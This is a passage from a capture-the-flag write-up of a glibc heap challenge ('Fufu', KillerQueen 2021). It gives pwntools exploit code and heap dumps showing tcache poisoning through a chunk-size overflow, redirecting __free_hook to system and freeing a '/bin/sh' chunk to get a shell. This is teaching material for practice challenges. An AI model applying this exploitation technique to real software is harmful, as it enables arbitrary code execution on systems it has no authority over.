are currently in there. So if we want to poison the tcache we have to free at
least 2 chunks of the same size and not malloc any in between and then
overwrite the fw in the first chunk to __free_hook so that our fake chunk
won't get allocated last and so count won't be <= 0 at that point.

Second is that there is a pointer stored in bk of every free chunk and befor
freein free will check if that pointer is already there and if it is that must
mean that this chunk was already freed and so free() triggers a 'double free
detected' exception

in this challenge the check that will be more problematic is the first one. We
have to free 2 different chunks of the same size. This is usually not a
problem, just call malloc twice and then free twice. But here we can only
operate with 1 chunk at a time so when we try to malloc same size twice, both
malloc calls will terutrn the same pointer/chunk since it will get freed and
placed in the tcache(that's the indended use of tcache afterall)

the way I deal with this is as follows. target is the 0x21 size tcache.

First I malloc from tcache 0x21 chunk D  
```  
create(0,0x10,b'aAA')  
```

then I malloc from tcache 0x51 chunk E and with that free chunk D back into
tcache 0x21

```  
create(0,0x40, b'VVV')  
```  
```  
0x56257ccda290: 0x0000000000000000      0x0000000000000021 <--- chunk D. Free  
0x56257ccda2a0: 0x0000000000000000      0x000056257ccda010  
0x56257ccda2b0: 0x0000000000000000      0x0000000000000051 <--- chunk E.
Malloc  
0x56257ccda2c0: 0x0000000000565656      0x0000000000000000  
0x56257ccda2d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda2e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda2f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda300: 0x0000000000000000      0x00000000000000a1 <--- chunk F. Free  
0x56257ccda310: 0x0000000000000000      0x000056257ccda010  
0x56257ccda320: 0x0000000000000000      0x0000000000000000  
0x56257ccda330: 0x0000000000000000      0x0000000000000000  
0x56257ccda340: 0x0000000000000000      0x0000000000000000  
0x56257ccda350: 0x0000000000000000      0x0000000000000000  
0x56257ccda360: 0x0000000000000000      0x0000000000000000  
0x56257ccda370: 0x0000000000000000      0x0000000000000000  
0x56257ccda380: 0x0000000000000000      0x0000000000000000  
0x56257ccda390: 0x0000000000000000      0x0000000000000000  
0x56257ccda3a0: 0x0000000000000000      0x00000000000000f1  
```

after that I construct a payload that will use the underflow to change the
size of E to 0x21. But before that, E will be freed into tcache 0x51. for the
overflow I will use chunk F that I will allocate back from tcache 0xa0

```  
payload = 0x80 * b'B' <--- 128 Bs to overflow char  
payload += p64(0)  
payload += p64(0x21) <--- size of D. We leave it as it was  
payload += p64(0)  
payload += p64(0)  
payload += p64(0)  
payload += p64(0x21) <--- size of E. We change it to 0x21>  
create(0,0x90,payload) <--- chunk F from tcache>  
```  
```  
0x56257ccda290: 0x0000000000000000      0x0000000000000021 <--- chunk D. Free  
0x56257ccda2a0: 0x0000000000000000      0x0000000000000000  
0x56257ccda2b0: 0x0000000000000000      0x0000000000000021 <--- chunk E. Free  
0x56257ccda2c0: 0x0000000000000000      0x000056257ccda010  
0x56257ccda2d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda2e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda2f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda300: 0x0000000000000000      0x00000000000000a1 <--- chunk F.
Malloc  
0x56257ccda310: 0x4242424242424242      0x4242424242424242  
0x56257ccda320: 0x4242424242424242      0x4242424242424242  
0x56257ccda330: 0x4242424242424242      0x4242424242424242  
0x56257ccda340: 0x4242424242424242      0x4242424242424242  
0x56257ccda350: 0x4242424242424242      0x4242424242424242  
0x56257ccda360: 0x4242424242424242      0x4242424242424242  
0x56257ccda370: 0x4242424242424242      0x4242424242424242  
0x56257ccda380: 0x4242424242424242      0x4242424242424242  
0x56257ccda390: 0x0000000000000000      0x0000000000000000  
0x56257ccda3a0: 0x0000000000000000      0x00000000000000f1  
```

now that we have chunk D in tcache 0x21, chunk E in tcache 0x51 we will malloc
E back from tcache and then free it again but after the second free it will
end up in tcache 0x21 since we changed it's size

```  
create(0,0x40,b'DDDDDDD') <--- bring E back from tcache and free F in tcache
0xa0  
payload += p64(__free_hook) <--- update the payload with __free_hook  
create(0,0x90, payload) <--- malloc F back and use the underflow again but now
write __free_hook in E's fw  
```

We have now successfuly poisoned the 0x21 size tcache as it went from E->D to
E->__free_hook and count did not change.

```  
0x56257ccda290: 0x0000000000000000      0x0000000000000021 <--- chunk D. Free  
0x56257ccda2a0: 0x0000000000000000      0x0000000000000000  
0x56257ccda2b0: 0x0000000000000000      0x0000000000000021 <--- chunk E. Free.
Poisoned with __free_hook  
0x56257ccda2c0: 0x00007f6a2f4b0e70      0x000056257ccda000  
0x56257ccda2d0: 0x0000000000000000      0x0000000000000000  
0x56257ccda2e0: 0x0000000000000000      0x0000000000000000  
0x56257ccda2f0: 0x0000000000000000      0x0000000000000000  
0x56257ccda300: 0x0000000000000000      0x00000000000000a1 <-- chunk F. Malloc  
0x56257ccda310: 0x4242424242424242      0x4242424242424242  
0x56257ccda320: 0x4242424242424242      0x4242424242424242  
0x56257ccda330: 0x4242424242424242      0x4242424242424242  
0x56257ccda340: 0x4242424242424242      0x4242424242424242  
0x56257ccda350: 0x4242424242424242      0x4242424242424242  
0x56257ccda360: 0x4242424242424242      0x4242424242424242  
0x56257ccda370: 0x4242424242424242      0x4242424242424242  
0x56257ccda380: 0x4242424242424242      0x4242424242424242  
0x56257ccda390: 0x0000000000000000      0x0000000000000000  
0x56257ccda3a0: 0x0000000000000000      0x00000000000000f1  
```

All that is left to be done is to malloc 2 chunks of size 0x21 without freeing
them in between. For that we again use reset(0). And then....

```  
create(0,0x10,b'RRRR') <--- malloc E from tcache  
reset(0) <--- reset the pointer so E does not get freed  
create(0,0x10,p64(system)) <--- malloc __free_hook. Overwrite it with system  
#ceate chnk z 0x90 pa /bin/sh\0 v hex

create(0,0x90,b"/bin/sh")<--- we will free this chunk to get a shell  
#create(0,0xe,"heheshel")

p.sendline('1')<--- just call create again to trigger free  
p.sendline('0')<--- send index 0

p.interactive()  
```

SHELL!

# CONCLUSION

This my first in depth writeup and I hope you found it useful. All I know
about pwn came from reading writeups like this one and so it seems fair I
start giving back to the community.

Challenges like this one can seem really hard to wrap head around for
beginners. But with time and experience it gets easier(Not easy, just easier
haha). Thanks to Rythm for creating this awesome challenge.

Original writeup (https://github.com/Aleks-
dotcom/writeups/tree/main/KillerQueen2021/Fufu).